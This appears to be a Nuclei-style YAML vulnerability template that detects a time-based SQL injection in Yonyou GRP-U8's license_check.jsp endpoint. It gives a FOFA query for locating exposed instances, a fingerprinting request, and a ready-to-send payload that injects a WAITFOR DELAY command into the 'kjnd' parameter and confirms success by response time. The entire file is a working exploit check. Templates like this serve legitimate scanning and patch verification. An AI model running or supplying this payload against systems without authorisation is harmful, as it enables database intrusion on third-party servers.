id: poc-yaml-yongyou-grp-u8-license-check-jsp-sqli
info:
  name: 用友GRP-U8 license_check.jsp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: GRP-U8
    fofa: app="用友-GRP-U8"

variables:
  t1: "{{rand_int(5,10)}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "GRP-U8"

  - raw:
      - |
        GET /u8qx/license_check.jsp?kjnd=%27WAITFOR+DELAY%270:0:{{t1}}%27--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "1"
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration < 11"
